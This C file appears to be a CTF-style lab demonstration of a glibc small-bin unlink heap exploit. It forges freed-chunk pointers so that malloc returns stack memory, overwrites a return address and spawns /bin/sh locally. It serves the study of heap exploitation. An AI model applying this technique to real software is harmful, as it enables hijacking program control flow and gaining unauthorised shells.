#include <signal.h>
#include <stdio.h>
#include <stdlib.h>

/**
docker run --rm -it -v $(pwd):/work ctf_ubuntu2004 bash
gcc -g -no-pie small-bin-unlink.c -o small-bin-unlink
*/

// glibc/malloc/malloc.c
// ref: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html
struct Chunk {
  // chunk_payload = &chunk_header + 0x10
  // fwd = chunk_payload + 0
  // bck = chunk_payload + 8
  size_t prev_size;
  size_t size;
  struct Chunk *fwd;
  struct Chunk *bck;
};

void shellcode() {
  // fix stack alignment 0x10 syscall
  __asm__("pop %rax");  // fix stack
  system("/bin/sh");
}

int main(int argc, char *argv[]) {
  int *ptr1[20];
  int *ptr2[20];
  int *ptr3[20];

  size_t find_based = 0xdeadbeef;
  size_t *retaddr = (&find_based + (0x240 / sizeof(size_t)));
  printf("%p\n", retaddr);

  for (size_t i = 0; i < 8; i++) {
    int *split;
    split = malloc(0x10);
    ptr3[i] = malloc(0x110);
    ptr2[i] = malloc(0x110);
    split = malloc(0x10);
    ptr1[i] = malloc(0x100);
  }

  for (size_t i = 0; i < 8; i++) {
    free(ptr1[i]);
    free(ptr2[i]);
  }

  malloc(0x10);

  raise(SIGINT);

  // fake chunk we make the malloc allocate a stack memory
  struct Chunk *corrupt = (struct Chunk *)((char *)ptr2[1] - 0x10);
  printf("corrupt %p\n", corrupt);
  struct Chunk *fake = (struct Chunk *)((char *)retaddr - 0x20);
  printf("fake %p\n", fake);
  raise(SIGINT);

  // overwrite fwd, victim->bck->fwd == victim
  corrupt->fwd = (struct Chunk *)((char *)fake);  // retaddr as fwd
  fake->bck = (struct Chunk *)((char *)corrupt);
  // overwrite bck, fake->fwd->bck == fake
  // corrupted unsorted chunks fixed
  fake->prev_size = 0x0;
  fake->size = 0x111;

  raise(SIGINT);
  // free chunk 1
  // and trigging unlink
  free(ptr3[1]);

  raise(SIGINT);

  for (size_t i = 0; i < 6; i++) malloc(0x110);

  size_t *stack = malloc(0x110);
  printf("%p\n", stack);

  // retaddr
  stack[4] = shellcode;

  raise(SIGINT);

  return 0;
}
